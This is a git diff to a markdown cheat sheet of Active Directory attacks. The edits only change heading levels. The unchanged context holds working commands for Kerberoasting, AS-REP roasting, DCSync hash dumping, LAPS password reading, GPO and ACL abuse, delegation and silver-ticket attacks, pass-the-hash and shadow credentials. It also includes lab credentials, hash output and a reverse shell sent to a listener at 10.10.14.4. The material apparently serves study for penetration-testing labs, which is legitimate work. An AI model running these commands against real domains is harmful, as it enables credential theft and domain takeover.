@@ -38,7 +38,7 @@ ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclas
 ldapsearch -x -H ldap://192.168.151.122 -D '' -w '' -b "DC=hutch,DC=offsec" | grep sAMAccountName
 ./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
 ```
-#### Computer Info
+### Computer Info
 ```
 Get-NetComputer
 Get-NetComputer | select operatingsystem,dnshostname
@@ -92,7 +92,7 @@ dnshostname                   : DC1.corp.com
 ```
 ./kerbrute bruteuser --dc 10.10.11.60 -d frizz.htb pass_file M.SchoolBus -v
 ```
-#### Object Permissions
+### Object Permissions
 GenericAll: Full permissions on object  
 GenericWrite: Edit certain attributes on the object  
 WriteOwner: Change ownership of the object  
@@ -118,7 +118,7 @@ When Stephanie has GenericAll permissions on "Management Department" group, you 
 ```
 net group "Management Department" stephanie /add /domain
 ```
-#### Enumerate Domain Shares
+### Enumerate Domain Shares
 ```
 powershell -ep bypass
 Import-module .\PowerView.ps1
@@ -126,7 +126,7 @@ Find-DomainShare
 ls \\dc1.corp.com\"Important Files"\
 type \\dc1.corp.com\"Important Files"\proof.txt
 ```
-#### BloodHound
+### BloodHound
 Initiation
 ```
 Compromised machine: Import-Module .\SharpHound.ps1
@@ -146,13 +146,13 @@ neo4j 4.4.26
 bloodhound 4.3.1
 SharpHound.ps1 1.1.1
 ```
-#### Bloodhound-python
+### Bloodhound-python
 This will extract all json files if you have credential but no shell
 ```
 bloodhound-python -ns 192.168.219.21 -d nagoya-industries.com -u 'Fiona.Clark' -p 'Summer2023' -c all
 sudo proxychains4 -f /etc/proxychains4.conf bloodhound-python -ns 10.10.179.140 -d oscp.exam -u 'web_svc' -p 'Diamond1' -c all --dns-tcp
 ```
-#### Abusing Read GMSAP Password
+### Abusing Read GMSAP Password
 ```
 Get-ADServiceAccount -Filter * | where-object {$_.ObjectClass -eq "msDS-GroupManagedServiceAccount"}
 Get-ADServiceAccount -Filter {name -eq 'svc_apache'} -Properties * | Select CN,DNSHostName,DistinguishedName,MemberOf,Created,LastLogonDate,PasswordLastSet,msDS-ManagedPasswordInterval,PrincipalsAllowedToDelegateToAccount,PrincipalsAllowedToRetrieveManagedPassword,ServicePrincipalNames
@@ -175,14 +175,14 @@ Calculating hashes for Current Value
 [*]       aes256_cts_hmac_sha1 : D3C18DAF21128CAFEAECE5BFF6599A0A4DFB2E9BE22F6CFE13677688B0A34988
 [*]       des_cbc_md5          : 0804169DCECB6102
 ```
-#### Abusing ReadLaps Password
+### Abusing ReadLaps Password
 >LAPS allows you to manage the local Administrator password (which is randomized, unique, and changed regularly) on domain-joined computers. These passwords are centrally stored in Active Directory and restricted to authorized users using ACLs. 
 ```
 lapsdumper -u fmcsorley -p CrabSharkJellyfish192 -d hutch.offsec -l 192.168.153.122
 lapsdumper -u user -p e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c -d domain.local -l dc host
 ldapsearch -v -c -D fmcsorley@hutch.offsec -w CrabSharkJellyfish192 -b "DC=hutch,DC=offsec" -H ldap://192.168.153.122 "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
 ```
-#### Abusing GPO (Group Policy Object)
+### Abusing GPO (Group Policy Object)
 Check:
 ```
 Import-Module .\PowerView.ps1
@@ -194,7 +194,7 @@ Abuse:
 ./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "Default Domain Policy" (add anirudh to local admin group)
 gpupdate /force
 ```
-#### Abusing "Group Policy Creator Owners"
+### Abusing "Group Policy Creator Owners"
 Members of this group can create and modify Group Policy Objects in the domain
 ```
 New-GPO -Name {{GPO-Name}} | New-GPLink -Target "OU=DOMAIN CONTROLLERS,DC=FRIZZ,DC=HTB" -LinkEnabled Yes
@@ -203,7 +203,7 @@ gpupdate /force
 rlwrap nc -nlvp 464
 .\RunasCs.exe 'M.schoolbus' '!suBcig@MehTed!R' cmd.exe -r 10.10.14.4:464
 ```
-#### Linux Abuse of Over large Permission Over Group and Object
+### Linux Abuse of Over large Permission Over Group and Object
 Add the user to the target group
 ```
 net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"
@@ -212,7 +212,7 @@ Change Existing user password
 ```
 net rpc password "TargetUser" "test@password123" -U "sequel.htb"/"ControlledUser"%"WqSZAF6CysDQbGb3" -S "10.10.11.51"
 ```
-#### Abusing WriteOwner over User
+### Abusing WriteOwner over User
 ```
 sudo timedatectl set-ntp off                                                                                          
 sudo rdate -n 10.10.11.51 
@@ -222,8 +222,7 @@ python3 dacledit.py -action 'write' -rights 'FullControl' -principal 'Controlled
 
 net rpc password "TargetUser" "test@password123" -U "sequel.htb"/"ControlledUser"%"WqSZAF6CysDQbGb3" -S "10.10.11.51"
 ```
-#### Abusing Active Directory Certificates
-Enumerating vulnerable certificates
+### Active Directory Certificates Enumeration
 ```
 certipy-ad find -u xxx -p xxxx -dc-ip xxx.xxx.xxx.xxx -stdout -vulnerable
 ```
@@ -248,7 +247,7 @@ certipy req -username ca_operator@certified.htb -hashes 'FB54D1C05E301E024800C6A
 certipy auth -pfx administrator.pfx -domain certified.htb
 ```
 
-#### Resource Based Constrained Delegation Attack
+### Resource Based Constrained Delegation Attack
 ```
 Detection:
 Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Where-Object { $_.ActiveDirectoryRights -like '*GenericWrite*' }
@@ -294,13 +293,13 @@ Change resourcedc.resourced.local machin_ip_address in /etc/hosts
 
 impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.x.x
 ```
-#### Dump the local password hash and domain cached hash
+### Dump the local password hash and domain cached hash
 ```
 Extract hashes from windows.old's sam and system file:
 
 impacket-secretsdump -sam SAM(local SAM file) -system SYSTEM(local SYSTEM file) local
 ```
-#### Domain Controller Synchronization
+### Domain Controller Synchronization
 >The DCSync permission implies having these permissions over the domain itself: DS-Replication-Get-Changes, Replicating Directory Changes All and Replicating Directory Changes In Filtered Set.
 
 >To perform this attack, we need a user that is a member of Domain Admins, Enterprise Admins, or Administrators, because there are certain rights required to start the replication. Alternatively, we can leverage a user with these rights assigned, though we're far less likely to encounter one of these in a real penetration test.
@@ -316,7 +315,7 @@ NTDS.DIT Secrets and Kerberos Key:
 impacket-secretsdump 'htb.local'/'venom':'newP@ssword2022'@10.10.10.161
 ```
 
-#### Abuse an NTLM user hash to gain a full Kerberos Ticket Granting Ticket(TGT) and gain rce
+### Abuse an NTLM user hash to gain a full Kerberos Ticket Granting Ticket(TGT) and gain rce
 https://learn.microsoft.com/en-us/sysinternals/downloads/psexec
 ```
 sekurlsa::logonpasswords
@@ -325,7 +324,7 @@ net use \\dc01(logon server)
 klist
 .\PsExec.exe \\dc01 or \\DC01/Allison cmd.exe
 ```
-#### AS-REP Roasting(Require Do not require Kerberos preauthentication enabled)
+### AS-REP Roasting(Require Do not require Kerberos preauthentication enabled)
 ```
 ASREPRoast with username list without pass:
 impacket-GetNPUsers nara-security.com/ -dc-ip 192.168.209.30 -usersfile users.txt -format hashcat -outputfile hashes.txt
@@ -341,7 +340,7 @@ Windows way:
 .\Rubeus.exe asreproast /nowrap
 hashcat -a 0 -m 18200 hashes.asreproast2 rockyou.txt -r /usr/share/hashcat/rules/best64.rule
 ```
-#### Kerberoasting
+### Kerberoasting
 >The goal of Kerberoasting is to harvest TGS tickets for services that run on behalf of user accounts in the AD, not computer accounts. Thus, part of these TGS tickets are encrypted with keys derived from user passwords. As a consequence, their credentials could be cracked offline. You can know that a user account is being used as a service because the property "ServicePrincipalName" is not null.
 
 >Therefore, to perform Kerberoasting, only a domain account that can request for TGSs is necessary, which is anyone since no special privileges are required.
@@ -367,7 +366,7 @@ Open a new terminal
 
 sudo ntpdate -s domain
 ```
-#### Silver Tickets(Require SPN's hash, Domain's SID, SPN)
+### Silver Tickets(Require SPN's hash, Domain's SID, SPN)
 >Service hash required 
 
 >Since silver and golden tickets represent powerful attack techniques, Microsoft created a security patch to update the PAC structure.5 With this patch in place, the extended PAC structure field PAC_REQUESTOR needs to be validated by a domain controller. This mitigates the capability to forge tickets for non-existent domain users if the client and the KDC are in the same domain. Without this patch, we could create silver tickets for domain users that do not exist. The updates from this patch are enforced from October 11, 2022.
@@ -405,7 +404,7 @@ Klist to view kerberos tickets
 #Always remember to sync the kdc time
 impacket-mssqlclient -k dc.sequel.htb
 ```
-#### Pass The Hash/Pass The Key
+### Pass The Hash/Pass The Key
 >In this attack, an attacker intercepts and steals a valid ticket-granting ticket (TGT) or service ticket (TGS) from a compromised user or service account.
 
 >The attacker then "passes" this stolen ticket to authenticate themselves as the compromised user or service without needing to know the account's password.
@@ -436,7 +435,7 @@ python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
 impacket-ticket_converter ticket.kirbi ticket.ccache
 impacket-ticket_converter ticket.ccache ticket.kirbi
 ```
-#### Privilege Escalation via azure ad sync
+### Privilege Escalation via azure ad sync
 ```
 Windows: sqlcmd -S MONTEVERDE -Q "use ADsync; select instance_id,keyset_id,entropy from mms_server_configuration"
 
@@ -444,7 +443,7 @@ evil-winrm -i 10.10.10.172 -u mhope -p "4n0therD4y@n0th3r$" -s .
 adconnect.ps1
 Get-ADConnectPassword
 ```
-#### Shadow Credential Attack
+### Shadow Credential Attack
 ```
 python3 pywhisker.py -d "certified.htb" -u "judith.mader" -p "judith09" --target "management_svc" --action "add"
 [*] Searching for the target account
